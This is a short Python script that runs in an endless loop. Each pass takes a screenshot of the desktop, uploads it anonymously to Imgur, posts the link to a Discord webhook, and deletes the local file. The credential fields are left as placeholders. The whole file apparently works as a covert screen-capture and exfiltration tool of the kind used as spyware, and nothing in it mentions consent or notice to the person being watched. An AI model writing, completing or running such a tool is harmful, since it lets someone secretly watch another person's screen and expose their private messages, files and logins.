import pyautogui
from imgurpython import ImgurClient
import requests
import json
import os
import time

IMGUR_CLIENT_ID = 'UR CLIENT ID' # https://api.imgur.com/oauth2/addclient
IMGUR_CLIENT_SECRET = 'UR CLIENT SECRET' # after creating app - https://imgur.com/account/settings/apps

DISCORD_WEBHOOK_URL = 'UR WEBHOOK URL' # discord webhook is here

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screen.jpg"
    screenshot.save(screenshot_path)
    return screenshot_path

def upload_to_imgur(image_path):
    client = ImgurClient(IMGUR_CLIENT_ID, IMGUR_CLIENT_SECRET)
    response = client.upload_from_path(image_path, anon=True)
    return response['link']

def send_discord_message(message):
    payload = {"content": message}
    headers = {"Content-Type": "application/json"}
    requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(payload), headers=headers)

def delete_screenshot(image_path):
    os.remove(image_path)

def main():
    while True:
        screenshot_path = take_screenshot()
        imgur_link = upload_to_imgur(screenshot_path)
        discord_message = f"screen: {imgur_link}"
        send_discord_message(discord_message)
        delete_screenshot(screenshot_path)
        time.sleep(12000)  # in secs.

if __name__ == "__main__":
    main()
